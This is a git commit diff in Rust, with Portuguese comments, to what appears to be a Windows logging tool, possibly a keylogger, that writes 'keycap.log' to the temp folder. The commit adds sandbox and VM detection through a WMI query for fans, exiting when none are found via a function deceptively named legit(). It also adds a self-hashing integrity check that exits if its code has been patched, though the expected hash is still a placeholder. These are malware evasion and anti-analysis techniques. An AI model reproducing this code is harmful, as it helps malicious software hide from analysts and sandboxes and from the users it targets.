58f27d2994673b73e6fda3df9b66612a3e65cdf5
poledna0 <henriquepoledna@proton.me>
2026-04-22 20:44:05 -0300

    feat: add a funcao de saber se esta dentro de uma vm baseada nos sensores, e tb fazendo hash das func sensiveis

--- src/main.rs
+++ src/main.rs
@@ -4,6 +4,12 @@ use std::fs::OpenOptions;
 //use chrono::{format, prelude::*};
 use std::io::Write;
 use std::fs::File;
+use std::collections::HashMap;
+use wmi::{COMLibrary, WMIConnection, WMIResult, Variant};
+use sha2::{Sha256, Digest};
+
+// precisa mudar dps para o hash da func depois de pronta
+const EXPECTED: [u8;32] = [0x34,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];
 
 // macro de erro
 macro_rules! error {
@@ -11,6 +17,9 @@ macro_rules! error {
         println!("[!] {}", format!($msg,$($arg),*))
     };
 }
+
+fn legit(){std::process::exit(1)}
+
 fn info_basica(file: &mut File){
     // aq estou pegando as informações do sistema, como verssao, o tipo de sistema e entre outros.
     let info_so = {
@@ -39,7 +48,68 @@ fn log(file: &mut File, s:String){
     }
 }
 
+// fn() é um function pointer (ponteiro de função)
+// isso não executa a função.
+// isso recebe o endereço dela.
+fn get_fn_addr(f: fn()) -> usize {
+    f as usize
+}
+
+fn hash_protected_region() -> Vec<u8> {
+    let start = get_fn_addr(integrity_start as fn());
+    let end   = get_fn_addr(integrity_end as fn());
+
+    let size = end - start;
+
+    let bytes = unsafe {
+        std::slice::from_raw_parts(start as *const u8, size)
+    };
+
+    let mut hasher = Sha256::new();
+    hasher.update(bytes);
+    hasher.finalize().to_vec()
+}
+
+#[inline(never)]
+#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
+pub fn integrity_start() {}
+
+#[inline(never)]
+fn check_vm() -> WMIResult<()>{
+    
+    let com_lib = COMLibrary::new()?;
+    let wmi_con = WMIConnection::new(com_lib)?;
+
+    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Fan")?;
+
+     if results.is_empty(){
+        legit();
+    }
+
+    Ok(())
+}
+
+#[inline(never)]
+#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
+pub fn integrity_end() {}
+
+
+fn verify_function_integrity() {
+    let current = hash_protected_region();
+
+    if current != EXPECTED {
+        //println!("Function patched!");
+        legit();
+    }
+}
+
 fn main() {
+
+    // temporario para pegar o hash oficial das func :)
+    //let h = hash_protected_region();
+    //println!("{:x?}", h);
+
+    
     let temp_path = std::env::temp_dir();
     let filename = temp_path.join("keycap.log");
 
